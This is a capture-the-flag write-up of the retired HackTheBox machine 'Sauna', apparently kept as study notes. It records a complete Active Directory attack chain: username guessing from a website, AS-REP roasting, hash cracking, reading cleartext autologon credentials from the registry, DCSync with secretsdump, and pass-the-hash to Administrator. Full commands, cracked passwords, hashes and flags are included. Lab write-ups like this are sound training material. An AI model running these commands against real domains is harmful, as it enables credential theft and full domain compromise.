# SAUNA - Easy

**Date Started:** June 9, 2026
**Difficulty:** Easy
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, AS-REP Roasting, Autologon, DCSync, Pass-the-Hash
**Status:** ✅ COMPLETE

---

## Summary / Attack Chain

Third AD box, same model — enumerate → roast → shell → find second credential → DCSync → DA. The twist: no ACL abuse needed. BloodHound showed svc_loanmgr already had DCSync rights; the gap was finding the password (autologon registry, not an ACL chain).

```
website employee names → build username list → AS-REP roast fsmith
  → crack → evil-winrm shell → user flag
    → BloodHound: svc_loanmgr has DCSync (GetChanges + GetChangesAll)
      → reg query Winlogon → autologon creds (svc_loanmgr:Moneymakestheworldgoround!)
        → secretsdump -just-dc-ntlm → Administrator hash → PtH → root
```

**New techniques vs Forest:** autologon credential harvesting (registry), username derivation from a website (no null-session user list). No ACL abuse — the privesc was finding a credential, not chaining permissions.

---

## Phase 1 — Enumeration

```bash
nmap -p- --min-rate 1000 -T4 <TARGET> -oN sauna_allports.txt
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV <TARGET> -oN sauna_services.txt
```

**Findings / reads:**
- Same **DC fingerprint** (53/88/389/636/3268/3269/445/464). Domain Controller.
- **Domain: `EGOTISTICAL-BANK.LOCAL`**, FQDN `SAUNA.EGOTISTICAL-BANK.LOCAL`.
- **Port 80 (HTTP)** — a bank website. Potential for username harvesting from "Meet the Team" pages.
- **Port 5985 (WinRM)** — open, same as Forest → evil-winrm if we get a valid credential.
- **Windows Server 2019** — modern OS, expect AD misconfig not OS CVE.

```bash
echo "<TARGET> EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL SAUNA" | sudo tee -a /etc/hosts
```

---

## Phase 2 — Username Enumeration

```bash
nxc smb <TARGET> -u '' -p '' --users
```
- Null session **denied** for user enumeration — Forest's playbook (null → user list) is closed here.

**Pivot:** the website (port 80) has employee names on the "About Us" / team page. Derive likely AD usernames using common naming conventions:

| Full Name | Likely Username |
|-----------|----------------|
| Fergus Smith | fsmith |
| Hugo Bear | hbear |
| Steven Kerb | skerb |
| Shaun Coins | scoins |
| Bowie Taylor | btaylor |
| Sophie Driver | sdriver |

Save to `users.txt`. Convention: `first-initial + lastname` is the most common AD format — try that first.

> **Lesson:** when enumeration tools are blocked, look for names in any accessible service (web, LDAP anonymous, SMTP VRFY). Then guess the naming convention — you only need one hit.

---

## Phase 3 — AS-REP Roasting → fsmith

Same concept as Forest: accounts with "Do not require Kerberos pre-authentication" hand you a crackable hash with no credential needed.

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip <TARGET> -usersfile users.txt -no-pass
```
- Most users → `KDC_ERR_C_PRINCIPAL_UNKNOWN` (username doesn't exist) or normal pre-auth required.
- **`fsmith`** → returns a `$krb5asrep$23$...` hash.

### Crack (Mac GPU, mode 18200)
```bash
scp opsbox:~/sauna/fsmith_asrep.hash ~/
hashcat -m 18200 ~/fsmith_asrep.hash ~/wordlists/rockyou.txt
```

> **Debug note:** if hashcat says "exhausted" but loaded the hash, the hash may be truncated from copy-paste. Use `-outputfile` on GetNPUsers or `cat` the file to verify every character. On Sauna, a missing trailing character caused a false "exhausted" — re-running GetNPUsers with `-outputfile` fixed it.

**Result:** `fsmith : Thestrokes23`

---

## Phase 4 — WinRM Shell + User Flag

5985 open + fsmith in Remote Management Users → interactive shell:
```bash
nxc smb <TARGET> -u fsmith -p 'Thestrokes23'           # validate (no Pwn3d — not admin)
evil-winrm -i <TARGET> -u fsmith -p 'Thestrokes23'     # shell
```
```
*Evil-WinRM* PS> type C:\Users\FSmith\Desktop\user.txt
# 51a5c67df551ea3a89552b63137e880d
```

---

## Phase 5 — BloodHound: Find the DCSync Principal

```bash
bloodhound-ce-python -d EGOTISTICAL-BANK.LOCAL -u fsmith -p 'Thestrokes23' -ns <TARGET> -c All --zip
# scp zip to Mac → ingest at localhost:8080 → mark fsmith Owned → Pathfinding
```

**Key finding:**
- fsmith has **no ACL path to DA** — only Remote Management Users + Domain Users. Dead end for ACL abuse.
- **`svc_loanmgr`** has **GetChanges + GetChangesAll** on the domain = **DCSync rights**.

The path isn't an ACL chain to abuse — it's a credential hunt. Find svc_loanmgr's password by any means, then DCSync directly.

> **Contrast with Forest:** Forest required a 3-step ACL chain (add to group → WriteDacl → grant DCSync). Sauna's DCSync principal already has the rights — the challenge is finding the password, not chaining permissions.

---

## Phase 6 — Autologon Registry → svc_loanmgr Creds

winPEAS can find this, but a targeted query is faster and avoids parsing 2000 lines:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Result:**
```
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmgr
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

**Why this works:** Windows autologon stores the username and password in **cleartext** in the Winlogon registry key so the system can log in automatically at boot. Any authenticated user can read `HKLM` — it's not a privilege issue, it's a design tradeoff (convenience vs. security). winPEAS flags this under its "AutoLogon" section in red.

### Validate
```bash
nxc smb <TARGET> -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
→ Confirmed valid.

---

## Phase 7 — DCSync → Pass-the-Hash → DA

svc_loanmgr already has DCSync — no bloodyAD needed, straight to the dump:

```bash
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@<TARGET> -just-dc-ntlm
```
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

### Pass-the-Hash → root
```bash
nxc smb <TARGET> -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e        # (Pwn3d!)
evil-winrm -i <TARGET> -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```
```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
# 59b083d307961406fc99f8de02e933e9
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `51a5c67df551ea3a89552b63137e880d` |
| root.txt | `59b083d307961406fc99f8de02e933e9` |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Lessons / Exam Relevance

- **Same model, third time** — enumerate → find anomaly → cred → "what does it unlock?" → escalate. Active (GPP→Kerberoast), Forest (AS-REP→ACL chain), Sauna (AS-REP→autologon). The *techniques* change, the *shape* doesn't.
- **Username derivation** — when null-session enumeration is blocked, harvest names from web pages, LinkedIn, email headers, LDAP anon-bind. Guess the naming convention (`fsmith`, `f.smith`, `fergus.smith`); you only need one valid hit for AS-REP/spray.
- **Not every privesc is an ACL chain** — Forest taught ACL abuse. Sauna teaches that sometimes the DCSync principal's password is just *sitting there* in a registry key. Don't tunnel-vision on one technique.
- **Autologon = cleartext password in the registry** — `HKLM\...\Winlogon` → `DefaultUserName` + `DefaultPassword`. Any domain user can read it. winPEAS flags it; `reg query` is the targeted alternative.
- **Hunt, don't read** — winPEAS dumps thousands of lines. Either grep for keywords (`autologon`, `defaultpassword`, `credentials`) or skip it entirely with a targeted query when you already know what you're looking for.
- **Truncated hashes** — copy-paste from terminal can silently drop characters. If hashcat loads a hash but "exhausts" without cracking, verify the hash file character-by-character. Use `-outputfile` to write hashes to disk instead of copying from screen.
- **DCSync doesn't need a shell** — it's a network operation (DRSUAPI replication). `secretsdump.py` runs from your attack box; no need to evil-winrm into the target first.

## Cleanup / Changes Made

- Uploaded `winPEASx64.exe` to `C:\Users\FSmith\Desktop\` — remove in a real engagement.
- No ACL changes made (svc_loanmgr already had DCSync; nothing was modified).

